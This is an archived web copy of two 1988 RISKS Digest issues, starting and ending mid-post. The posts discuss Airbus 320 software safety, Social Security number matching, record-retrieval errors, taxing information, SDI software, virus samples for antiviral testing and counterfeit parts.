   believes it is unsafe."

   "Michael Hennell, Professor of computational mathematics at Liverpool 
   University, wants to stop the Civil Aviation Authority licensing the latest 
   European Airbus, the 320.  He alleges that the computer program that will 
   fly the plane is flawed."

   "Hennell, 47, has worked for the government and the EC on computer design.
   He accused the aircraft's designers of making "absurd" safety claims and has
   challenged Airbus Industrie to prove that the computer would break down no
   more than once in every billion hours of operation, as the company claims."

   "He is supported by Bev Littlewood, Professor of Software Engineering at 
   City University, London.  Littlewood says he also has serious doubts about 
   the reliability of the computer system and believes Airbus's claims are 
   unrealistic."

   "Airbus yesterday rejected the charges, and said the 320 would be the safest
   passenger aircraft ever.  `We believe that the safety requirement of a total
   breakdown occurring only once every billion hours is achievable,' a 
   spokesman said.  Airbus dismissed Hennell's fears as extravagant and 
   `wildly off target,' but admitted the computer had failed during test 
   flying.  The breakdowns were caused by teething problems and the aircraft 
   had landed safely, it said."

   ...

   "The 320 is the latest and most advanced Airbus built by the four-nation
   consortium...It is the first Airbus to use a computer system, nicknamed
   `fly-by-wire,' to carry out many tasks normally performed by a pilot."

   "Airbus said fly-by-wire made the aircraft safer by preventing it stalling
   or manoeuvering [sic] too violently.  It also saved fuel costs by keeping
   the aircraft on optimum trim."

   "But Hennell claimed the aircraft relied too heavily on the system. `There
   are always inherent faults in the software.  If the Airbus computer breaks
   down it will put the plane in jeopardy.'"

   "Hennell pointed to the crash of a US F-18 military aircraft, in which the
   pilot failed to recover from a spin because the on-board computer thought
   his commands were `too extreme' and blocked them."

   "He is to apply for an injunction to stop the CAA [similar to the U.S. FAA] 
   approving an airworthiness certificate for the 320.  The CAA said
   yesterday it did not believe there was a safety problem with the Airbus
   computer. `The CAA has rigorous procedures for the certification of all 
   aircraft systems ... In the case of the Airbus we are satisfied that the
   tests carried out achieve the safety objectives.'"

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
File matching
</A>
</H3>
<address>
Barry Nelson 
&lt;<A HREF="mailto:bnelson@ccb.bbn.com">
bnelson@ccb.bbn.com
</A>&gt;
</address>
<i>
Fri, 26 Feb 88 18:14:34 EST
</i><PRE>

Well-I-suspected-as-much Department:

I discovered this tidbit in the Federal Register (52 FR 49556, 31 DEC 1987) and
thought I'd pass it along to the group.  Other such systems may already be in
place at other agencies, but I just happened to notice this one today.

COMPUTER MATCHING PROGRAM - US Postal Service/Federal Creditor Agencies - 

The Post Office "...intends to conduct continuous matches [between] files of
delinquent debtors [supplied by various Federal agencies] and its payroll file.
Using the Social Security Account Number, USPS will [prepare a list of USPS
employees who] may be subject to salary offset under the Debt Collection Act of
1982 [subject to due process]. [Of course we'll manually verify any hits and
carefully discard erroneous information, so nobody will retain an undeservedly
bad reputation]."

In other words, "We're using your SSN, which we solicited solely for IRS
record-keeping purposes, to check on your bill-paying habits too." 

What next?  Badge-readers that make you write a check to get in the door?

Barry C. Nelson

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
     Mistaken Identity and Display of Retrieved Sets
</A>
</H3>
<address>
"James H. Coombs" 
&lt;<A HREF="mailto:JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU">
JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 25 Feb 88 23:29:37 EST
</i><PRE>

Amos Shapir writes:

         The Israeli state collection agency issued a warrant for the
         arrest of a debtor; since they had only his name (a rather
         common one) and the town he lived in, a clerk completed the
         missing information - full address, ID number and father's name
         - from the first entry for a person of the same name he found
         in the citizen's registry.

At first, this clerk's action sounds extremely irresponsible.  It's quite
common, however, for a system to retrieve a set of records and display them
one at a time.  A naive operator may well not be aware that more than one
record has been retrieved (yes, there may still be some irresponsibility
here).  Whether or not the incident followed this scenario, we should keep
the possibility in mind and consider displaying the number of records
retrieved before displaying any records.  (Or an alert box might work as
well for a Mac-style interface.)

PGN comments:

     [This one is computer-related in the sense that input data should
     acquire an appropriate measure of trustworthiness and then be
     handled accordingly.  That measure should stay with the data, as
     is the case with a security label.  PGN]

What does this mean?  Practically?  How would one implement a "measure of
trustworthiness" for a data set such as this.  Also, I have treated it as
a retrieval problem; but PGN focuses on input.  Does this mean that there
should be something like a primary key, and that this primary key must be
involved in all retrievals?  Furthermore, would this primary key have to
be something more descriptive than an automatically generated surrogate,
such that any reasonably trained and attentive operator would notice an
error immediately?  But then what would the key consist of to defeat the
sort of error that Amos reports?
                                               --Jim

Dr. James H. Coombs, Software Engineer, Research 
Institute for Research in Information and Scholarship (IRIS), Brown University

    [In this case, the OUTPUT should bear a credibility label such as 

       "THE FOLLOWING ITEM IS ONE OF POSSIBLY MANY THAT MATCHES THE REQUEST."

    If data is marked on input or on acquisition as to its credibility,
    and then the output process further diminishes the credibility based
    on the contextual nature of the processing, a lot of the false matches
    might have less impact on the user.  This is a serious problem in the
    identification of suspects based on partial information, where the
    input data may not have been verified and the processing may introduce
    further uncertainties.  ("Fuzzy logic" revisited?)  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Taxing information
</A>
</H3>
<address>
Dick King
&lt;<A HREF="mailto:king@kestrel.ARPA ">
king@kestrel.ARPA 
</A>&gt;
</address>
<i>
Wed, 24 Feb 88 08:36:15 PDT
</i><PRE>

    Date: 17 Feb 88 07:48:28 GMT
    From: Steven Koinm &lt;goog@a.cs.okstate.edu&gt;
    Subject: Taxing of information
    Organization: Oklahoma State Univ., Stillwater

    I recently came across an interesting idea presented by a hacker
    while doing research for a paper.  The hacker said that he could
    not consider information property because it cannot be taxed. [...]

Seems bogus to me.  The hacker's lament is that the value of the piece
of information cannot be precisely measured.

There are other pieces of information whose values cannot be precisely
measured.  I understand that they are sometimes taxed [or split in a
marital property settlement, which is a similar idea] based on the
cost of acquiring them, sometimes on a market value, and sometimes on
an estimated value of unclear origin.

Examples of eack of these valuation methids include an oilfield of
unknown extent, a patent, and a professional license.

    Would this make people stop collecting HUGE amounts of information
    that they keep around just for the sake of "I'll need that
    someday" or "Why bother erasing it, it may still be valid."

Information depreciates.  A software concern can sometimes depreciate
the software over three years rather than expensing the effort of
producing the software as it is expended.

</PRE>
<HR><H3><A NAME="subj7.2">
Re: Taxing of information (<A HREF="/Risks/6.30.html">RISKS-6.30</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Jeff_MacKie-Mason@um.cc.umich.edu">
Jeff_MacKie-Mason@um.cc.umich.edu
</A>&gt;
</address>
<i>
Wed, 24 Feb 88 21:28:20 EST
</i><PRE>

In many countries, one form of information *is* taxed.  In most western
European countries, information that is covered by a valid patent is not
protected unless the patentee pays an annual renewal fee, effectively
taxing the value of that intellectual property to its owner.  Of course,
the fees make no attempt to assess the value of the property to the owner,
but many taxes take on a fixed-fee form.
                    
Jeff MacKie-Mason, Dept. of Economics, University of Michigan

</PRE>
<HR><H3><A NAME="subj7.3">
Re: Taxing of Information
</A>
</H3>
<address>
&lt;<A HREF="mailto:jong%delni.DEC@decwrl.dec.com">
jong%delni.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
25 Feb 88 12:15
</i><PRE>

An unnamed hacker has raised the question of taxing information.  This is
perhaps only a "risk" if it catches on, but the technical question is how it
could be done.  Well, taking my cue from Xerox, which keeps a cycle counter
in its machines and thus charges a cent or so per copy, I say it's simply a
matter of an application program keeping a counter of how many times it was
invoked.  It could also track how many times it opened individual data
files.  If the counter was encrypted, it might be safe from hacking.

Egads! Every time I fire up PageMaker I pay a one cent tax to the IRS.  Or
worse, a tax plus a royalty to Aldus! I can see that adding up fast.  Of
course, the IRS will create a standard withholding for users of computers; you
will have to prove that you didn't actually use the program as much as was
assumed, by including the encrypted Federal program ID/counter string on a
form that you must file every year by August 10th (one copy per program);
except for shareware authors, who must file a form listing all users who have
registered, as failure to notify the IRS of a user of a shareware program is a
criminal offense...

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: the risks of voice recognition in banking services (<A HREF="/Risks/6.30.html">RISKS-6.30</A>) 
</A>
</H3>
<address>
&lt;<A HREF="mailto:kew%hldg00.DEC@src.dec.com ">
kew%hldg00.DEC@src.dec.com 
</A>&gt;
</address>
<i>
Wed, 24 Feb 88 03:16:04 PST
</i><PRE>

If it is the TSB service, then funds transfers can only be made to
pre-arranged destinations, ie, you go into the bank and set up the service
for phone gas electricity etc - to pay your bills, so, the worst someone can
do is pay your bills for you. They could also find out your balance.  They
also offer a keypad which fits over the microphone allowing you to enter a
p.i.n. and then drive a menu of voice synthesized options.
                                                               Jerry Kew

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
SDI S/W
</A>
</H3>
<address>
Fred Baube 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Thu, 11 Feb 88 08:50:41 -0500
</i><PRE>

For a paper on the future of strategic (i.e. nuclear) stability between the
superpowers, I'd like to hear about sources that explore the prospects for
systemic stability in Star Wars software.  Possible topics:

- The possibility of unstable software behavior in a tightly-
  linked system due to feedback .. a la Black Monday, say.

- Design techniques to forestall/circumvent such built-in unstable behavior 

- The prospects for keeping human decision makers in the loop
  during a crisis involving SDI

- Lessons learned from other large distributed S/W systems, such as the ATC 
  upgrade, or the stock market, or even telecommunications

- The prospects for SDI S/W research creating the ability to generate
  error-free S/W directly from algorithmic or even English-language functional
  descriptions (assuming that such a description is itself error-free,
  naturally).

I'm looking for articles, manuscripts, ruminations, anecdotes, personal
speculation, SDIO blatherings, whatever.  Also ANY info about the National Test
Bed contract to Martin Marietta.  Also general info about the use, misuse, and
abuse of simulations, and how the SDI S/W developers plan on convincing us that
they have avoided these pitfalls.  Thanx in advance.

#include &lt;disclaimer.h&gt;
Disclaimer #2: This paper is not for my employer.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Request for Viruses to be used to test AntiBiotics
</A>
</H3>
<address>
Amir Herzberg 
&lt;<A HREF="mailto:amirh%TECHUNIX.BITNET@CNUCE-VM.ARPA">
amirh%TECHUNIX.BITNET@CNUCE-VM.ARPA
</A>&gt;
</address>
<i>
Mon, 22 Feb 88 19:01:40 +0200
</i><PRE>

The risk of Viruses, especially in computers w/o hardware supported secure
OS, is of much concern lately. We intend to develop software to protect
against viruses in an unprotected environment (e.g. a PC - even an AT with
MS-DOS). Some of the software is "preventive", other is "corrective".  The
software will be developed as projects in "Lab for Advanced Prog."  course.

  To test the software, and to improve understanding of the Viruses, we need
samples of viruses. Anybody who has a contaminated disk is requested to send
it to me: Amir Herzberg, Comp. Science Dept., Technion, Haifa, Israel.  I will
return a disk (if requested, with the programs when done).  Physical disks may
be better then e-mailed files. To check if I already have your Virus, or for
more details, e-mail is amirh@techunix.bitnet or amirh@techsel.bitnet. Thanks
for the co-operation!!!
                                           Amir Herzberg

P.S. I represent in the entire matter myself only, not the Technion (or
anyone else...).
P.S.S. Detailed information would also be most welcome.

   [See my comment on Dave Horsfall's message in <A HREF="/Risks/6.31.html">RISKS-6.31</A> on the dangers
   of Trojan horses (and bugs!) in allegedly antiviral software.  What a
   wonderful opportunity to plant Trojan horrors, in both directions --
   to Amir and from Amir.  The risks are more than Amir pittance.  PGN]

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Viruses and "The Adolescence of P-1" (Re: Risks-6.31)
</A>
</H3>
<address>
&lt;<A HREF="mailto:preedy@nswc-wo.ARPA">
preedy@nswc-wo.ARPA
</A>&gt;
</address>
<i>
Thu, 25 Feb 88 08:26:46 est
</i><PRE>
Cc: pgarnet@csl.sri.com

I just finished reading the novel "The Adolescence of P-1" by Thomas J.
Ryan, which was mentioned by Kian-Tat Lim.  This was a very
thought-provoking novel.  Considering the learning capabilities that exist
when using neural networks, it is hard to say where fact meets fiction in
this book.  That is scary.  Could a computer possibly take over?  What risk
are we taking when we teach a computer to learn?
                                                        Pat Reedy

              [The author of the Adolescence of P1 is Thomas J. Ryan, 
              published by Collier, in 1977.   JPAnderson@DOCKMASTER.ARPA]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.31.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.33.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-69</DOCNO>
<DOCOLDNO>IA012-000130-B024-366</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.33.html 128.240.150.127 19970217015814 text/html 22491
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:56:41 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 33</TITLE>
<LINK REL="Prev" HREF="/Risks/6.32.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.34.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.32.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.34.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 33</H1>
<H2> Monday 29 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks of Believing in Technology 
</A>
<DD>
<A HREF="#subj1.1">
Matt Bishop
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Slippery slopes and the legitimatization of illegitimacy 
</A>
<DD>
<A HREF="#subj2.1">
David Thomasson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Post Office Loses Its Zip Maker 
</A>
<DD>
<A HREF="#subj3.1">
Charles Youman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  File matching 
</A>
<DD>
<A HREF="#subj4.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  More double troubles 
</A>
<DD>
<A HREF="#subj5.1">
Peter Capek
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Government accountability rules used to justify inspection of all files    
</A>
<DD>
<A HREF="#subj6.1">
Marc Gibian
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Counterfeit products 
</A>
<DD>
<A HREF="#subj7.1">
Gordan Palameta
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: viruses 
</A>
<DD>
<A HREF="#subj8.1">
Marcus J. Ranum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  "The Adolescence of P-1" 
</A>
<DD>
<A HREF="#subj9.1">
Jonathan I. Kamens
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Computerized voting &amp; punch cards 
</A>
<DD>
<A HREF="#subj10.1">
Will Martin
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks of Believing in Technology (Re: <A HREF="/Risks/6.32.html">RISKS-6.32</A>)
</A>
</H3>
<address>
Matt Bishop 
&lt;<A HREF="mailto:bishop%bear.dartmouth.edu@RELAY.CS.NET">
bishop%bear.dartmouth.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 08:26:02 EST
</i><PRE>

   This is in regard to your article "Back-Seat Driving Goes High Tech".
There's one other risk of that computerized loud-mouth back-seat driver.
Driving with an ill-tempered co-driver makes otherwise calm people very
nervous, thereby decreasing their ability to monitor other traffic safely,
scan the road, take foul weather (e.g., ice on the road, heavy rain) into 
account, and in general do all the things that they do as well as when calm.
So these people will either have trouble ignoring the device or will become
so flustered that they will come to depend on the device to an unhealthy
extent. In either case, the risk of them getting into an accident jumps
with the installation of a device that is supposed to prevent accidents!

   A personal peeve here.  I have no objection -- indeed, I welcome -- the
use of technology to improve our abilities -- the hand-held calculator is a
wonderful thing! But when the technology allows people to depend on that
technology to such an extent basic skills start to disappear, there is
something wrong with the use of that technology.  Anyone who's seen a
teenager struggle to multiply 314 and 512 by hand, then give up and reach
for a calculator, knows just what I mean.
                                                  Matt 

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
     Slippery slopes and the legitimatization of illegitimacy
</A>
</H3>
<address>
        David Thomasson 
&lt;<A HREF="mailto:ST401405%BROWNVM.BITNET@MITVMA.MIT.EDU">
ST401405%BROWNVM.BITNET@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Sat, 27 Feb 88 13:49:11 EST
</i><PRE>

   As a philosopher who is not a computer expert, I've noticed a kind of
argument in the Risks Forum that is worth commenting on. It is usually called
a slippery-slope argument. Two recent examples: A writer cautioned that the
electronic homing devices for locating stolen cars could be misused by police
to monitor the car-owner's whereabouts. Another writer warned that if the
electronic back-seat driver called "Lookout" (it shouts at the driver when
obstructions are ahead) is widely used, drunks and other impaired drivers
"will be taking to the road with alacrity."

   The slippery-slope principle is the same in any application: If we allow a
particular device (power, authority, privilege, etc.) to be used for some
legitimate end, we open the way for its being used toward illegitimate ends.

   What makes this an uninteresting kind of argument is that it applies to
*any* device, power, authority, etc. The arrest powers of police are subject
to abuse; lawyer-client privilege is subject to abuse; and so on.

   It might help if writers who employ this argument distinguished possibility
from risk. It is *possible* that a computer mishap will result in a $1000
phone bill next month. But should I regard this as a *risk* of having a phone?
I don't think so. There at least two factors that help distinguish
possibilities from risks. One is the probability that the event in question
will occur. The other is what is available to prevent or deter the event or
behavior in question. The two are obviously related. And the line between
possibility and risk is obviously blurred.

   Perhaps if writers considered these factors they might conclude either that
what appeared to be a risk really isn't one, or that the risk is smaller (or
greater) than it appeared to be. Arguments in Risks would be generally more
persuasive if writers would, when pointing out a risk, assess the *degree* of
the risk as they see it. Sometimes the alarm is sounded a bit too loudly.

    [As has been noted frequently in RISKS, (1) probabilities are irrelevant
    when it is YOUR life that is lost; (2) technology does not always work
    the way it was supposed to.  That is not a philosophical point, but a 
    reality.  If a computer mishap results in your getting a $1000 phone
    bill, the phone company will eventually recant.  But incapable drivers
    are linked with many irreversible events.  BIG DIFFERENCE.  PGN]
 
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Post Office Loses Its Zip Maker
</A>
</H3>
<address>
Charles Youman (youman@mitre.arpa) 
&lt;<A HREF="mailto:m14817@mitre.arpa">
m14817@mitre.arpa
</A>&gt;
</address>
<i>
Fri, 26 Feb 88 13:25:27 EST
</i><PRE>

For an upcoming conference I've been trying to work out the details with
the Post Office so that we can include a business reply envelope with our
preliminary program.  The Post Office normally provides the camera ready
artwork for the facing identification mark (the bars that appear at the
top of the envelope) and the Zip + 4 barcodes that appear at the bottom.
This process normally only takes a couple of days so after a couple of
weeks had gone by without receiving them, I called the Post Office to check
their status.  The explanation I received was that a piece of equipment
was down and was not expected to be back in service until March 7th.  
While it was not specifically identified as a computer that had failed,
it was mentioned in passing that (1) the outage was nationwide and (2)
it prevented the assignment of Zip + 4 addresses.  Business reply mail has
a different Zip + 4 address than other mail to the same location.  What
surprises me is that there appears to be a single point of failure in 
what is otherwise a very decentralized organization.  It may have saved
the Post Office a couple of bucks when they bought the equipment, but
it's costing them more now since it takes more labor to process mail
that doesn't have the barcodes.

Charles Youman (youman@mitre.arpa)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 File matching (Barry Nelson) [<A HREF="/Risks/6.32.html">RISKS-6.32</A>] 
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Sat, 27 Feb 88 22:40:34 EST
</i><PRE>

	Folks, I'm afraid that the battle over use of SSN for other than
taxpaying functions is lost.  The practice is simply too pervasive in our
society (the ultimate distributed system!) ever to be discontinued.

	So, let's concentrate on specifics.  Here, we have an application
where technology is being used to enforce the law requiring people who have
borrowed money from the taxpayers to pay it back.  I have heard people brag
that they'll recommend that their kids take out Federally-financed loans to
pay for their educations and not bother to pay back the loans.  I, for one,
would LOVE to see such people caught by their own Social Security Numbers.

	As always, we have to consider the risks of NOT using computers;
here, such risk is that we would allow our system to become bankrupt
rather than catch those who have cheated all of us.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
More double troubles
</A>
</H3>
<address>
&lt;<A HREF="mailto:Peter G. Neumann <NEUMANN@csl.sri.com> [Really from CAPEK@IBM.COM]">
Peter G. Neumann &lt;NEUMANN@csl.sri.com&gt; [Really from CAPEK@IBM.COM]
</A>&gt;
</address>
<i>
Mon 29 Feb 88 11:00:12-PST
</i><PRE>

Peter Capek me by SnailMail copies of two clippings out of his files, each
relating to two people with the same Social Security Number.

  Ann Marie O'Connor, 21, Queens NY and Anne Marie O'Connor, 22, of 
  Larchmont NY, both with the same SSN.  Both are 5' 5", with brown hair and
  brown eyes, birthdays in September, and a father and a brother named
  Daniel.  It took the government 9 months to straighten out a request
  for a name change when the first AMO'C got married, during which time 
  she was being dunned for back taxes based on their COMBINED incomes.
  [From page 12 of an unspecified issue of MONEY]   [That's running AMO'C!] 

  James Edward Taylor, (Manhattan) NY, NY, Health Department inspector, 
  and James Edward Taylor, (Brooklyn) NY, NY, Postal Service employee,
  share the same names, birthdates (23 July 1919), and states of birth
  (Virginia).  They also share the same SSN.  The error was detected
  in 1965, but still had not been corrected eight years later, by which
  time all sorts of interference problems had arisen.  [NY Times, 18
  March 1973]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Government accountability rules used to justify inspection of all files
</A>
</H3>
<address>
Marc Gibian
&lt;<A HREF="mailto:harvard!apollo!marc.UUCP@seismo.css.gov ">
harvard!apollo!marc.UUCP@seismo.css.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 25 Feb 88 18:49 GMT
Organization: Apollo Computer, Chelmsford, Mass.

Raytheon Company subjects all its multi-user machines to a policy of random
verification of file contents.  Their justification is that government policy
requires that they insure that file space is used only for chargeable work and
that violation of this policy constitutes fraud.  Raytheon takes this policy
that extra step and interprete it as meaning that they -MUST- actively inspect
the contents of their file systems to insure that only proper files are stored
there.  This inspection is done with no regard to the security attributes
assigned to files.  They also state that they can demand that encrypted files
be decrypted for inspection.

Files explicitly classified illicit are:

Resumes     (Of course, at least once a year your are asked to supply your
             management a resume so they can show the customers the staff's
             qualifications)

Phone lists (I guess the paper you write these down on are not subject to the
             same rules)

Personal correspondence (Do email letters count?)

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Counterfeit products
</A>
</H3>
<address>
&lt;<A HREF="mailto:maccs!gordan@uunet.uu.net">
maccs!gordan@uunet.uu.net
</A>&gt;
</address>
<i>
Thu, 25 Feb 88 19:46:04 EST
</i><PRE>

The Sat 20 Feb 1988 issue of the Toronto Globe and Mail has an interesting
article on counterfeit products.  The gist of the story is that when you
mention counterfeit products, most people think of fake Lee jeans or Rolex
watches; however, many other less well known items are involved as well,
with important safety implications.  The article is by Carey French -- here
are a few excerpts (reprinted without permission):

  "Engineers working on a vast new U.S. Postal Service complex in
  earthquake-prone Los Angeles were aghast when they discovered that as many
  as one third of the 140,000 metal fasteners used to hold the steel-framed
  structure together were phony."

  "In Augusta, Ga. a woman gave birth after her contraceptive pills,
  labeled Ovulin 21, a product of U.S.-based G. D. Searle and Co., turned
  out to be fakes made in Panama."

  "On the computer files of the National Transportation Safety Board in
  Washington, the words "bogus part" feature in at least 15 aircraft
  accidents between 1975 and 1986."

  "Bolts that do not meet the specifications promised by their markings have
  been implicated in the deaths of a window washer who fell from a high-rise
  platform in Houston and of an artilleryman serving with NATO forces."

The article states that the "dent left by counterfeiting in world trade
was estimated at $60-billion in 1984 and ... appears to be increasing."
A retired veteran of the City of London Police is quoted as saying, "I
don't think we are aware of the enormity of all this" and "It's highly
sophisticated and there's evidence that organized crime is involved."

Gordan Palameta      mnetor!lsuc!maccs!gordan

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re:  viruses (<A HREF="/Risks/6.31.html">RISKS-6.31</A>)
</A>
</H3>
<address>
Marcus J. Ranum
&lt;<A HREF="mailto:osiris!mjr@PRC.Unisys.COM ">
osiris!mjr@PRC.Unisys.COM 
</A>&gt;
</address>
<i>
Sat, 27 Feb 88 12:51:35 EST
</i><PRE>

	I can see a wonderful business niche for unscrupulous hackers: computer
assassination. How much would DBMS Inc. 'A' pay to know that I would insert a
lethal virus in the development code of DBMS Inc. 'B' that would cause erratic
behaviour and delay the release of the competition's product by a few months ?

	Maybe that's what's happening to OS/2   :-)

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
"The Adolescence of P-1"
</A>
</H3>
<address>
&lt;<A HREF="mailto:jik@ATHENA.MIT.EDU">
jik@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Fri, 26 Feb 88 02:30:53 EST
</i><PRE>

In <A HREF="/Risks/6.31.html">RISKS-6.31</A>, Kian-Tat Lim (ktl@wagvax.caltech.edu) mentions the
book, "The Adolescence of P-1" as an example of an intelligent,
information-hunting virus.

The book is by Thomas J. Ryan, and it was published by Collier Books,
ISBN 0-02-024880-6.

The back cover reads:

  This is the story of an American youth.  And we don't mean Huck Finn.

  P-1 is the brainiest computer program ever hatched.  And the first with real
  built-in human feelings.  As a happy infant, P-1 makes some people very rich.
  Later, like adolescents everywhere, our sensitive hero becomes the victim of
  an uncomprehending adult world.  With its first identity crisis, P-1 escapes
  its home computer, infiltrates the far-flung world-s electronic network, and
  hides out while it grows up.  But soon it finds itself at war with the entire
  U.S. military establishment and, in a bizarre family drama, is forced to seek
  help from its brilliant, spaced-out human father and his sexy wife.

  The final "readout" is astonishing, catastrophic, and chilling in the most
  original science thriller of the year -- the revolt of the machine brought to
  its ultimate conclusion.

I enjoyed the book quite a bit, although it is necessary to suspend
disbelief a bit, mostly because the only mainframes discussed are
those made by IBM and Control Data [ugh!].

 -=&gt; Jonathan I. Kamens      MIT '91           

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
 Computerized voting &amp; punch cards
</A>
</H3>
<address>
Will Martin -- AMXAL-RI 
&lt;<A HREF="mailto:wmartin@ALMSA-1.ARPA">
wmartin@ALMSA-1.ARPA
</A>&gt;
</address>
<i>
Mon, 29 Feb 88 9:28:40 CST
</i><PRE>

Since there seems to be interest amongst RISKS readers about the recent
court rulings on punch-card voting here in St. Louis, I append below an
